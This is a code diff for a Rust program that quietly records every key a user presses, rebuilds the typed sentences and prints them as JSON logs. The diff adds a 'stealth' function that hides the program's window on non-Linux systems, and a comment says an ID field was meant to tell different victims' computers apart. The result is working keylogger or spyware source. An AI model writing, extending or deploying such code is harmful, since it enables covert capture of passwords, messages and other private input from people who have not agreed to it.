@@ -1,18 +1,23 @@
-use crate::modules::{window::title::*};
 use rdev::{EventType::*, Key::*};
 use serde_json::json;
 mod modules;
 
-// TODO: Ignore certain applications e.g.
-// TODO: Take screenshots to show more
-// TODO: Cleanup this damn code.
+// TODO: Ignore certain applications e.g. games - will be configurable
+// TODO: Take screenshots to show more context.
+// TODO: Ignore keyboard shortcuts
+
+fn stealth() {
+    #[cfg(not(target_os = "linux"))]
+    crate::modules::window::title::stealth();
+}
+
 fn main() {
     stealth();
-
+    // keep tack of cursor position using left and right arrow keys
     let mut cursor_pos = 0;
-
+    // hold current word like this ["apple"]
     let mut key_buffer: Vec<String> = Vec::new();
-
+    // hold current sentence like this ["hello", "world!"]
     let mut words: Vec<String> = Vec::new();
 
     rdev::listen(move |event| {
@@ -20,6 +25,7 @@ fn main() {
             KeyPress(key) => Some(key),
             _ => None,
         };
+        //Get the keybuffer as a string, quite a misleading name
         let sentence = key_buffer.iter().map(|s| &*s.trim()).collect::<String>();
 
         if let Some(key) = key {
@@ -52,13 +58,17 @@ fn main() {
                         None => None,
                     };
                     if kcode == Some(127_u8) {
-                        // DEL WORD
+                        // handling DEL WORD
+                        // won't work on linux
+                        if words.len() > 0 {
+                            words.pop();
+                        }
                     } else if cursor_pos >= 1 {
                         key_buffer.remove(cursor_pos - 1);
-                        // BACKSPACE
+                        // handle BACKSPACE key
                         cursor_pos -= 1;
                     } else {
-                        // DELETE
+                        // handle DELETE key
                     }
                 }
                 Return => {
@@ -66,15 +76,18 @@ fn main() {
                     if words.last().unwrap() == "" {
                         words.remove(words.len() - 1);
                     }
+                    // convert the word array into one sentence
                     let sentence_from_words = words.join(" ");
                     words.clear();
                     key_buffer.clear();
                     cursor_pos = 0;
                     if sentence_from_words.trim() != "" {
                         let log = json!({
+                            // does nothing but was intended to identify different computers from each other
                             "rid": "0001",
                             "text": sentence_from_words,
-                            "window": get_window_name(),
+                            // you can fetch window_titles if you can use winapi right now
+                            // maybe I'll find a way to do this on linux and just use conditionals
                         });
                         println!("{}", log);
                     }
@@ -94,7 +107,11 @@ fn main() {
 }
 
 // Adds keys to kb
-fn add_key_to_kb(key: String, kb: &mut Vec<String>, pos: usize) -> Result<(), Box<dyn std::error::Error>> {
+fn add_key_to_kb(
+    key: String,
+    kb: &mut Vec<String>,
+    pos: usize,
+) -> Result<(), Box<dyn std::error::Error>> {
     kb.insert(pos, key);
     Ok(())
 }
